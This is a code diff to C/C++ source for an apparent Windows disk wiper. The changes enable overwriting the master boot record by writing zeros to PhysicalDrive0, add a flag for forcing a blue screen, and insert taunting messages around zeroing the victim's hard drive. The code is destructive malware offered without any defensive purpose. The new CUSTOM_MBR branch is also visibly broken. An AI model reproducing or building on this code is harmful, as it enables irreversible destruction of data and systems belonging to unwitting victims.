@@ -16,9 +16,10 @@
 
 //GENERAL ARGUMENTS
 //COMMENT OUT TO DISABLE A SPECIFIC FEATURE
-//  #define OW_MBR 
-    #define ZERO_DRIVE 
-//  #define BSOD 
+    #define OW_MBR 
+//  #define CUSTOM_MBR
+//  #define ZERO_DRIVE 
+    #define BSOD 
 
 
 
@@ -64,13 +65,21 @@ bool OverwriteMBR()
 {
 
     DWORD bytes_read = 512;
+    
+    HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+#ifdef CUSTOM_MBR
+    char* buffer = new char{}
+#else
     char* buffer = new char[MBR_SIZE];
     ZeroMemory(buffer, MBR_SIZE);
-    HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+
     bool res = WriteFile(hMBR, buffer, MBR_SIZE, &bytes_read, 0);
+    
+#endif
     CloseHandle(hMBR);
     delete[] buffer;
     return res;
+
 }
 
 bool WriteChunk(HANDLE handle, char* buffer, OVERLAPPED* ol)
@@ -163,6 +172,7 @@ int main()
     
 
 #ifdef ZERO_DRIVE
+    printf("Attempting to zero out your hard drive :)");
     if (ZeroDrive())
     {
         printf("Zeroed out some of your drive :D");
